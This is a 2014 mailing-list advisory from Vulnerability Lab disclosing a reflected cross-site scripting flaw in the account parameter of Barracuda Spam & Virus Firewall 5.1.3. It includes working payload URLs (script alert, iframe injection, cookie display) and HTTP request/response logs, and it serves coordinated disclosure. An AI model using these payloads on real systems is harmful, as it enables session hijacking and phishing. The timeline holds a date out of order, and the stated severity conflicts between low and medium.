
Date: Mon, 28 Jul 2014 10:30:05 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Barracuda Networks Spam&Virus Firewall v5.1.3 - Client Side Cross
 Site Vulnerability

Document Title:
===============
Barracuda Networks Spam&Virus Firewall v5.1.3 - Client Side Cross Site Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1118

Barracuda Networks Security ID (BNSEC):  BNSEC-1052
https://www.barracuda.com/support/knowledgebase/501600000013lYI

Solution #00006606
BNSEC-01052: Non-persistent XSS in Barracuda Spam and Virus Firewall v5.1.3


Release Date:
=============
2014-07-25


Vulnerability Laboratory ID (VL-ID):
====================================
1118


Common Vulnerability Scoring System:
====================================
2.9


Product & Service Introduction:
===============================
For efficient, effective corporate communication and collaboration, today’s organizations need more than just 
security against spam and malware. They need a comprehensive email governance solution that combines granular 
policy management, real-time visibility into email activity, and the ability to handle massive volume and 
huge files. Barracuda Spam & Virus Firewall is today’s solution for comprehensive email governance.

(Copy of the Vendor Product Homepage: https://www.barracuda.com/products/spamandvirusfirewall/ )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered a client-side cross site vulnerability in the Barracuda Spam and Virus Firewall v5.1.3 (200,400 or 600) & Vx web-application.


Vulnerability Disclosure Timeline:
==================================
2013-11-19:	Researcher Notification & Coordination (Ateeq Khan)
2013-11-19:	Vendor Notification (Barracuda Networks Security Incident Team - Bug Bounty Program)
2014-12-20:	Vendor Response/Feedback (Barracuda Networks Security Incident Team - Bug Bounty Program)
2014-07-15:	Vendor Fix/Patch (Barracuda Networks Developer Team)
2014-07-25:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Barracuda Networks
Product: Spam & Virus Firewall 6.0.0.028 - 100 200 300 400 500 600 700 800 900 1000


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A client-side cross site scripting web vulnerability is detected in the official Barracuda Spam & Antivirus Firewall Web-Application.
The vulnerability allows remote attackers to manipulate via POST method web-application to browser requests (client-side).

The vulnerability is located in the `Per User Account View` module of the security appliance web-application. The vulnerable file is 
index.cgi and the affected value is `account`. Remote attackers can inject own malicious script codes on client-side. The attack 
vector of the issue is non-persistent and the request method to execute the malicious code is GET. Remote attackers can for example 
send manipualted links to priviledged application users to hijack session information (client-side) or execute non persistent codes.

The security risk of the non-persistent input validation web vulnerability is estimated as low with a cvss (common vulnerability 
scoring system) count of 2.9. The non persistent cross site vulnerability can be exploited by remote attackers without privileged 
application user account and with low or medium user interaction. Successful exploitation of the client-side cross site scripting 
web vulnerability results in session hijacking, client-side phishing, client-side unauthorized external redirects and client-side 
manipulation of the connected or affected module context.

Request Method(s):
				[+] GET

Vulnerable Module(s):
				[+] Users > Per User Account View

Vulnerable File(s):
				[+] index.cgi

Vulnerable Parameter(s):
				[+] account=


Proof of Concept (PoC):
=======================
The client-side cross site scripting web vulnerability can be exploited by remote attackers without privileged web-application user account and with 
low user interaction click. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the security vulnerability ...

1. Login to the spam and antivirus firewall as normal guest user
2. Once logged in, click on the Basic Tab once
3. Now copy paste the following payload in the URL carefully after the password field replacing all other variables with our string

&primary_tab=USERS&new_secondary_tab=per_user_account_view
&account=domainadmin@...racuda.comaf92c"><script>alert(1)</script>e352896d01c&auth_type=Local&locale=en_US
&secondary_tab=per_user_change_password&page_submitted=true&content_only=1&domain=&user=guest&role=&ispopup=1
&parent_name=pu_pref637248&popup_width=720&popup_height=500

4. You should now be able to see a javascript popup revealing the session cookies hence proving the existence of this vulnerability!


PoC: Frame Inject
https://spam.ptest.cudasvc.com/cgi-mod/index.cgi?auth_type=Local&et=1382217804&locale=en_US
&password=03f27a30cecedbbda727698954077eec&primary_tab=USERS&new_secondary_tab=per_user_account_view
&account=domainadmin@...racuda.comaf92c%3E%3Ciframe%20src=http://www.vulnerability-lab.com%3Ee352896d01c
&auth_type=Local&locale=en_US&secondary_tab=per_user_change_password&page_submitted=true&content_only=1
&domain=&user=guest&role=&ispopup=1&parent_name=pu_pref637248&popup_width=720&popup_height=500

PoC: Cookie Steal
https://spam.ptest.cudasvc.com/cgi-mod/index.cgi?auth_type=Local&et=1382217804&locale=en_US
&password=03f27a30cecedbbda727698954077eec&primary_tab=USERS&new_secondary_tab=per_user_account_view
&account=domainadmin@...racuda.comaf92c%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3Ee352896d01c
&auth_type=Local&locale=en_US&secondary_tab=per_user_change_password&page_submitted=true&content_only=1
&domain=&user=guest&role=&ispopup=1&parent_name=pu_pref637248&popup_width=720&popup_height=500


Review: Change Password - Mail Session Title
  <tbody><tr><td colspan="1" style="padding:0 0 5px 0;" valign="top" width="100%">
  <table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr><td class="TitleLeft"></td><td class="TitleTop">
      <table border="0" cellpadding="0" cellspacing="0" width="100%">
        <tbody><tr><td><a name="Change Password:domainadmin@...racuda.comaf92c>
<iframe src=http://www.vulnerability-lab.com>e352896d01c">
Change Password:domainadmin@...racuda.comaf92c><iframe src="http://www.vulnerability-lab.com">e352896d01c</td>



--- PoC Session Request Logs ---
Request:
--------
GET /cgi-mod/index.cgi?auth_type=Local&et=1382217804&locale=en_US&password=03f27a30cecedbbda727698954077eec&primary_tab=USERS&new_secondary_tab=per_user_account_view&account=domainadmin@...racuda.comaf92c%3E%3Cscript%3Ealert(document.cookie)%3C/script%3Ee352896d01c&auth_type=Local&locale=en_US&secondary_tab=per_user_change_password&page_submitted=true&content_only=1&domain=&user=guest&role=&ispopup=1&parent_name=pu_pref637248&popup_width=720&popup_height=500 HTTP/1.1
Host: spam.ptest.cudasvc.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: ys-preview_west=o%3Acollapsed%3Db%253A1; ys-preview_south=o%3Acollapsed%3Db%253A1; ys-preview_east=o%3Acollapsed%3Db%253A0
Connection: keep-alive

Response:
---------
HTTP/1.1 200 OK
Server: BarracudaHTTP 4.0
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: ys-preview_west=o%3Acollapsed%3Db%253A1; path=/
Set-Cookie: ys-preview_south=o%3Acollapsed%3Db%253A1; path=/
Set-Cookie: ys-preview_east=o%3Acollapsed%3Db%253A0; path=/
Expires: Thu, 18 Oct 2012 23:48:26 GMT
Date: Fri, 18 Oct 2013 23:48:26 GMT
Content-Length: 8325

<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">

...[Trimmed]...
<a name="Change Password:domainadmin@...racuda.comaf92c"><script>alert(document.cookie)</script>e352896d01c"/>
...[Trimmed]...


Reference(s):
https://spam.ptest.cudasvc.com/cgi-mod/index.cgi


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse of the account and session id echo when processing to reset passwords via the email address.
Parse the parameter value input of the account and encode the output in the session values.

Barracuda Networks: Appliances > Advanced > Firmware Updates (automatic) page or use the regular customer panel 
https://www.barracuda.com/support/knowledgebase/501600000013lYI


Security Risk:
==============
The security risk of the client-side cross site scripting web vulnerability is estimated as medium.


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Ateeq ur Rehman Khan (ateeq@...lution-sec.com) [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either 
expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers 
are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even 
if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation 
of liability for consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break 
any vendor licenses, policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    dev.vulnerability-db.com	 	- forum.vulnerability-db.com 		       		- magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2014 | Vulnerability Laboratory [Evolution Security]


-- 
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


